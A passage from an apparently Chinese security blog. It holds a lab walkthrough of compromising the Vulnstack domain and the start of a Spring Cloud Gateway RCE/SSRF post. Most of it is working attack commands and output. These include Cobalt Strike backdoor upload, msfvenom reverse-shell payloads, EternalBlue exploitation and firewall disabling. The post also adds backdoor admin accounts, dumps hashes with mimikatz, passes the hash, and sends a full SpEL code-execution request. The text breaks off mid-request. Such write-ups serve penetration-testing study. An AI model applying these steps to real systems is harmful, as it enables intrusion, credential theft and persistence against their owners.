<p>发现同目录下有yxcms,主页有管理员登录地址和管理员用户名和密码<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124191647.png" alt="Pasted image 20231124191647.png"></p>
<p>进去之后也可以执行sql语句<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124191701.png" alt="Pasted image 20231124191701.png"></p>
<h4 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h4><p>不过不用管,这个主页面的shell就是administrators权限,直接上传cs生成的后门就能上线cs<br><img src="https://s2.loli.net/2023/10/08/EeXpAytwls5niqS.png" alt="image.png"><br><img src="https://s2.loli.net/2023/10/08/miRwQ8vDbKtac6y.png" alt="image.png"><br>先设置回显时间:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep 1</span><br></pre></td></tr></table></figure></p>
<h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell ipconfig</span><br><span class="line">net view </span><br><span class="line">根据ip信息推测内网网段是192.168.52.x/24</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124194435.png" alt="Pasted image 20231124194435.png"></p>
<p>发现两台机器192.168.52.138和192.168.52.141,当前域名是god.org<br>执行命令：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view /domain 查询域列表 GOD</span><br><span class="line"></span><br><span class="line">查询同域机器  net view </span><br><span class="line">\\OWA                                                                          </span><br><span class="line">\\ROOT-TVI862UBEH                                                              </span><br><span class="line">\\STU1 </span><br><span class="line"></span><br><span class="line">判断主域 net time /domain</span><br><span class="line">Current time at \\owa.god.org is 2024/12/5 23:59:57</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查询域用户 net user /domain</span><br><span class="line">User accounts for \\owa.god.org</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    krbtgt                   </span><br><span class="line">ligang                   liukaifeng01                                 </span><br><span class="line">The command completed with one or more errors.</span><br></pre></td></tr></table></figure></p>
<p>cs执行net view<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Server Name             IP Address                       Platform  Version  Type   Comment</span><br><span class="line">-----------             ----------                       --------  -------  ----   -------</span><br><span class="line">OWA                     192.168.52.138                   500       6.1      PDC    </span><br><span class="line">ROOT-TVI862UBEH         192.168.52.141                   500       5.2             </span><br><span class="line">STU1                    192.168.52.143                   500       6.1             </span><br></pre></td></tr></table></figure></p>
<p>域：god.org</p>
<p>域内有三个用户：Administrator、ligang、liukaifeng01</p>
<p>域内三台主机：ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)、OWA</p>
<p>域控：OWA(192.168.52.138)</p>
<p> win7内网ip：192.168.52.143</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>getuid发现是admin,需要提权到system<br>第一种方法用cs自带的提权(svc-exe)即可成功提权,提权成功后发现会多生成一个一样的beacon信息,身份是system<br><img src="https://s2.loli.net/2023/10/08/y7FH9uVY4ixLsr1.png" alt="image.png"></p>
<p>第二种方法用systeminfo补丁来打<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo &gt; systeminfo.txt</span><br><span class="line"></span><br><span class="line">python2 windows-exploit-suggester.py -d 2021-04-16-mssb.xls -i systeminfo.txt</span><br></pre></td></tr></table></figure><br><img src="https://s2.loli.net/2023/10/08/xfhvrJkwRyjDK3e.png" alt="image.png"></p>
<p>这里随便找一个CVE都可以打,在msf里具体展现</p>
<p>运行下mimikatz,抓出当前机子(win7)的密码<br><img src="https://s2.loli.net/2023/10/08/ZGXmzHUPf9xSipd.png" alt="image.png"></p>
<p>其实这里admin用户直接运行mimikatz也能得到当前win7的机子密码<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204180510.png" alt="image.png"><br>这里成功获取我的win7的改过的密码</p>
<h4 id="cs-gt-msf"><a href="#cs-gt-msf" class="headerlink" title="cs-&gt;msf"></a>cs-&gt;msf</h4><p>新建一个监听器<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124200508.png" alt="Pasted image 20231124200508.png"></p>
<p>这张图是以前的,ip需要设置为kali的ip:192.168.213.135<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124211137.png" alt="Pasted image 20231124211137.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）msfconsole                    // 打开 MSF 工具</span><br><span class="line"> </span><br><span class="line">（2）use exploit/multi/handler                                   // 设置 监听 模块.</span><br><span class="line"> </span><br><span class="line">（3）set payload windows/meterpreter/reverse_http                // 设置 payload</span><br><span class="line"> </span><br><span class="line">（4）set lport 9999                        // 设置一个端口（和上面的监听一样的端口）</span><br><span class="line"> </span><br><span class="line">（5）set lhost 0.0.0.0                    // 设置本地的 IP 地址</span><br><span class="line"> </span><br><span class="line">（6）exploit                              // 进行测试</span><br></pre></td></tr></table></figure>
<p>返回cs<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124211430.png" alt="Pasted image 20231124211430.png"></p>
<p>此时msf收到meterpreter<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231124211449.png" alt="Pasted image 20231124211449.png"></p>
<p>此外我们也可以使用msf来联动cs:<br>msf生成木马:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.213.135 lport=4422 -f exe &gt; bgxg.exe</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）msfconsole</span><br><span class="line"> </span><br><span class="line">（2）use exploit/multi/handler</span><br><span class="line"> </span><br><span class="line">（3）set payload windows/meterpreter/reverse_tcp</span><br><span class="line"> </span><br><span class="line">（4）set lhost 192.168.213.135                         # 本地 IP 地址</span><br><span class="line"> </span><br><span class="line">（5）set LPORT 4422                                     # 和后面一样的端口</span><br><span class="line"> </span><br><span class="line">（6）run</span><br></pre></td></tr></table></figure>
<p>此时收到meterpreter &gt;</p>
<p>也可以把msf的meterpreter转移到cs</p>
<h4 id="msf-gt-cs"><a href="#msf-gt-cs" class="headerlink" title="msf-&gt;cs"></a>msf-&gt;cs</h4><p>cs监听器保持这样<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231126152508.png" alt="Pasted image 20231126152508.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（1）background                // 挂起 会话.</span><br><span class="line"> </span><br><span class="line">（2）use exploit/windows/local/payload_inject</span><br><span class="line"> </span><br><span class="line">（3）set payload windows/meterpreter/reverse_http</span><br><span class="line"> </span><br><span class="line">（4）set lhost 172.31.9.255        //设置 CS 服务端的 IP 地址.</span><br><span class="line"> </span><br><span class="line">（5）set lport 8787               //设置 CS 服务端的 监听的端口(刚刚上面创建的端口号一样[CS的])</span><br><span class="line"> </span><br><span class="line">（6）set DisablePayloadHandler True</span><br><span class="line"> </span><br><span class="line">（7）set PrependMigrate True</span><br><span class="line"> </span><br><span class="line">（8）sessions -l  //查看 会话 是多少则设置多少</span><br><span class="line"> </span><br><span class="line">（9）set session 1 [一般是 1(上面查看的结果)]</span><br><span class="line"> </span><br><span class="line">（10）exploit      // 进行 测试.</span><br></pre></td></tr></table></figure>
<p>此时成功转到cs</p>
<h4 id="搭建隧道"><a href="#搭建隧道" class="headerlink" title="搭建隧道"></a>搭建隧道</h4><p>这里用的chisel<br>上传chisel.exe<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204180645.png" alt="image.png"></p>
<p>服务端<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./chisel server -p 6666 --reverse</span><br></pre></td></tr></table></figure></p>
<p>win7<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chisel.exe client 192.168.213.135:6666 R:socks</span><br></pre></td></tr></table></figure><br>这里运行失败了,报错无法找到一个dll,应该是系统的问题,npc那些都不行<br>这里用autoroute模块</p>
<p>MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用 MSF 去访问原本不能直接访问的内网资源，只要路由可达我们既可使用 MSF 来进行探测了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204185204.png" alt="image.png"></p>
<p>此时添加成功<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><br>查看路由<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204185228.png" alt="image.png"></p>
<p>使用MSF开启socks代理<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set version 4a</span><br><span class="line">set srvhost 0.0.0.0</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p>通过jobs查看代理设置成功</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204185612.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204185741.png" alt="image.png"></p>
<p>使用 MSF apr模块探测内网存活主机<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">set RHOSTS 192.168.52.0/24</span><br><span class="line">set SESSION 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204190123.png" alt=""><br>使用proxychains探测内网端口开放情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sV 192.168.52.141</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204190834.png" alt="image.png"></p>
<p>发现445端口</p>
<p>使用永恒之蓝扫描模块查看是否存在漏洞<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p>
<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><h5 id="win3k3"><a href="#win3k3" class="headerlink" title="win3k3"></a>win3k3</h5><p>开打<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204191450.png" alt="image.png"></p>
<p>发现需要修改下模块和target<br>换了exploit/windows/smb/ms17_010_psexec也不行,最后只能用auxiliary/admin/smb/ms17_010_command 模块执行单步命令<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command </span><br><span class="line">set rhosts 192.168.52.141</span><br><span class="line">set command whoami</span><br><span class="line">run</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204192132.png" alt="image.png"></p>
<p>发现是system权限,尝试加入用户</p>
<p>开启3389端口:<br>原命令<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set command REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020231126000306.png" alt="Pasted image 20231126000306.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set command net user jmx qwer1234!@#$ /add</span><br><span class="line">set command net localgroup administrators jmx /add</span><br></pre></td></tr></table></figure>
<p>这里一开始密码设置的1234，远程桌面没连上去,执行了net user发现用户没加上<br>应该是密码复杂度有要求</p>
<p>然后换成qwer1234!@#$成功写进去了，远程登陆域选择本地计算机的域<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020241206002313.png" alt="Pasted image 20241206002313.png"></p>
<p>另一种是用telnet横向移动：<br>这里选择用telnet登录<br>开启telnet服务:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND sc config tlntsvr start= auto  </span><br><span class="line">set COMMAND net start telnet  </span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204193046.png" alt="image.png"></p>
<p>查看telnet是否成功开启<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND netstat -an</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set command net user hack1 admin.123 /add</span><br><span class="line"></span><br><span class="line">创建telnetclients组</span><br><span class="line">net localgroup telnetclients /add</span><br><span class="line"></span><br><span class="line">将hack1加入telnetclients组</span><br><span class="line">set command net localgroup telnetclients hack1 /add</span><br></pre></td></tr></table></figure>
<p>使用代理telnet直接使用创建的用户名登录 成功拿下服务器<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains telnet 192.168.52.141</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241204201356.png" alt="image.png"></p>
<h5 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h5><p>最终的目的是打域控： 192.168.52.138<br>通过端口扫描发现他也有永恒之蓝漏洞<br>直接开打<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set command whoami</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p>然后和打Windows7一样开启远程端口，写后门用户，但是这里需要注意个问题，防火墙默认是不允许远程连接服务通过的，所以我们需要在meterpreter里关闭防火墙<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">set command &quot;netsh advfirewall set allprofiles state off&quot;</span><br></pre></td></tr></table></figure></p>
<p>然后操作和之前一样<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set command REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\&quot; \&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line">set command net user yk yk123!@# /add</span><br><span class="line">set command net localgroup administrators yk /add</span><br><span class="line"></span><br><span class="line">set command net user yyk yk123!@#456 /add</span><br><span class="line">set command net localgroup administrators yyk /add</span><br><span class="line"></span><br><span class="line">net user</span><br><span class="line">net user /domain</span><br><span class="line">此时可以发现用户yk和yyk写到域GOD里面</span><br></pre></td></tr></table></figure><br>此时远程桌面连接成功，但是前提是必须只能登陆一个用户<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020241206005639.png" alt="Pasted image 20241206005639.png"></p>
<p>登陆的用户名需要写GOD\yk，因为默认是OWA域，无法登陆成功</p>
<p>然后我们使用正向shell可以弹一个meterpreter<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020241206010357.png" alt="Pasted image 20241206010357.png"></p>
<p>抓哈希<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">kiwi_cmd &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure></p>
<p>这里报错： ERROR kuhl_m_sekurlsa_acquireLSA ; mimikatz x86 cannot access x64 process</p>
<p>执行getpid: Current pid: 1444<br>执行ps，寻找一个x64进程，记住进程号<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020241206011131.png" alt="Pasted image 20241206011131.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">migrate 2288</span><br></pre></td></tr></table></figure>
<p>再执行<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure><br>当登录用户是新建的yk时<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020241206011303.png" alt="Pasted image 20241206011303.png"></p>
<p>当登陆用户是liukaifeng时<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/Pasted%20image%2020241206012750.png" alt="Pasted image 20241206012750.png"></p>
<p>获取域内所有成员的ntlm：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd &quot;lsadump::lsa /patch&quot;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : e25bbe456dd96a635f4434511788e502</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM : </span><br><span class="line"></span><br><span class="line">RID  : 000001f6 (502)</span><br><span class="line">User : krbtgt</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 58e91a5ac358d86513ab224312314061</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : liukaifeng01</span><br><span class="line">LM   : </span><br><span class="line">NTLM : e25bbe456dd96a635f4434511788e502</span><br><span class="line"></span><br><span class="line">RID  : 00000452 (1106)</span><br><span class="line">User : ligang</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 1e3d22f88dfd250c9312d21686c60f41</span><br><span class="line"></span><br><span class="line">RID  : 00000456 (1110)</span><br><span class="line">User : Yokan</span><br><span class="line">LM   : </span><br><span class="line">NTLM : df51f5925bd9da6d00af6a69615197fc</span><br><span class="line"></span><br><span class="line">RID  : 00000459 (1113)</span><br><span class="line">User : yk</span><br><span class="line">LM   : </span><br><span class="line">NTLM : fca2ca87ff6578acc7349d65ca2cbb6f</span><br><span class="line"></span><br><span class="line">RID  : 0000045a (1114)</span><br><span class="line">User : yyk</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 47d0b9eaf3f45ff9b13347fed27cf144</span><br><span class="line"></span><br><span class="line">RID  : 000003e9 (1001)</span><br><span class="line">User : OWA$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : d425673b5d53908e6d9482581d115600</span><br><span class="line"></span><br><span class="line">RID  : 00000450 (1104)</span><br><span class="line">User : ROOT-TVI862UBEH$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 66c2600ceac277440b024a222bb37b79</span><br><span class="line"></span><br><span class="line">RID  : 00000451 (1105)</span><br><span class="line">User : STU1$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 9e1cedc81b7001208afa36021ae8cb63</span><br><span class="line"></span><br><span class="line">RID  : 00000453 (1107)</span><br><span class="line">User : DEV1$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : bed18e5b9d13bb384a3041a10d43c01b</span><br></pre></td></tr></table></figure>
<p>pth<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd &quot;Sekurlsa::pth /user:liukaifeng01 /domain:god.org /ntlm:e25bbe456dd96a635f4434511788e502&quot;</span><br></pre></td></tr></table></figure></p>
<p>需要谁就改谁<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\ip\c$</span><br></pre></td></tr></table></figure><br>验证</p>
<p>这里用win7的cs的beacon来验证<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz Sekurlsa::pth /user:Administrator /domain:god.org /ntlm:e25bbe456dd96a635f4434511788e502</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\192.168.52.138\c$</span><br><span class="line">dir \\192.168.52.141\c$</span><br></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://xz.aliyun.com/t/14336?time__1311=GqAxuD9Wite05DK5YK0%3DKQCt5Ti%3DdqW4D#toc-3">https://xz.aliyun.com/t/14336?time__1311=GqAxuD9Wite05DK5YK0%3DKQCt5Ti%3DdqW4D#toc-3</a></li>
<li><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/#screenshot">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/#screenshot</a></li>
<li><a href="https://www.linkedin.com/pulse/mimikatz-x86-cannot-access-x64-process-fast-easy-solution-%C3%B6zt%C3%BCrk">https://www.linkedin.com/pulse/mimikatz-x86-cannot-access-x64-process-fast-easy-solution-%C3%B6zt%C3%BCrk</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Cloud Gateway RCE和SSRF映射内网</title>
    <url>/2025/01/03/Spring%20Cloud%20Gateway%20RCE%E5%92%8CSSRF%E6%98%A0%E5%B0%84%E5%86%85%E7%BD%91/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接用vulhub的环境：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull vulhub/spring-cloud-gateway:3.1.0</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>添加过滤器（POST）<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/gateway/routes/test HTTP/1.1</span><br><span class="line">Host: 192.168.1.247:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT</span><br><span class="line">If-None-Match: &quot;3147526947+gzip&quot;</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;test&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;whoami\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241208160012.png" alt="image.png"></p>
<p>响应码是201就对了<br>刷新过滤器（POST）<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: 192.168.1.247:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241208160153.png" alt="image.png"></p>
<p>访问过滤器ID（GET）<br><a href="http://192.168.1.247:8080/actuator/gateway/routes/test">http://192.168.1.247:8080/actuator/gateway/routes/test</a><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20241208160137.png" alt="image.png"></p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>映射内网: 这里在物理机开了一个python的监听服务:<br><a href="http://192.168.1.247:8888/">http://192.168.1.247:8888/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/gateway/routes/evil HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: csrftoken=OM3FxDI0M4njXhH0zVNJtCGRfdK3yRmZINRnazGlPHBJ7gXQ1SgmGh9AofjMsomi; rememberMe=UbyG+puy2EL1Yunmn7gz8Ymrg5p9w6q7bHzTbk+SIDR13mgYzmv/iMmA9RylIE3rgt3FG3FkXIU54cNvsefZxuPV9YU0Tp+vnbtt2VlmSIxV55FVb7PvDJ3aPIz7EF2A5tXeQ2bx+sEFDuTPKFVhRjtrblyBX/OrrbRG5MSURTWGQVDpZlvJ5bJ1jf2JAy5yCLmk9mrUzqaEmaRDKi2oFzNd9jV9qIz2yeVtZ3jJsIX2ZlKr4tVGBxK+gA3ldAnj/G5P/iU8RltCVWusuXOvhZJfwQjBtJeSTaj9PN0W1mu5fbJdY2qiTwgdpGfOeUxZZXG5sqaFRxSKuE7NpgHi74UoVR+BUg3tazhqL40MzQ3sKcz8BT3H7uftxDvr7JNC2jGXOy4dhFRM4ph+LPp1XhcwSP1V1I8wwacat7wks877f29ZYzp9nyEGqMndzKC/XUSJ8UIIsb574B+p2wltNzTSbuxgnVu/QFVVkx33fQPd8qfEh5AYrfI62zgj77Ql; _ga_0WLTHS96P4=GS1.1.1712136317.1.1.1712136329.0.0.0; _ga=GA1.1.737516964.1712136317; CactiDateTime=Tue Jul 16 2024 16:24:46 GMT+0800 (ä¸­å½æ åæ¶é´); CactiTimeZone=480; _ga_P1E9Z5LRRK=GS1.1.1725342668.1.0.1725343017.0.0.0; cookie_token=cc04b17c8e9948cd4ae7e5a62e6aaab84e806df77a171b2d761526e2f0b07537; Drupal.toolbar.collapsed=0; wp-settings-time-1=1734415947</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 348</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;predicates&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Path&quot;,</span><br><span class="line">      &quot;args&quot;: &#123;</span><br><span class="line">        &quot;_genkey_0&quot;: &quot;/evil/**&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;filters&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;name&quot;: &quot;RewritePath&quot;,</span><br><span class="line">      &quot;args&quot;: &#123;</span><br><span class="line">        &quot;_genkey_0&quot;: &quot;/evil/(?&lt;path&gt;.*)&quot;,</span><br><span class="line">        &quot;_genkey_1&quot;: &quot;/$&#123;path&#125;&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;uri&quot;: 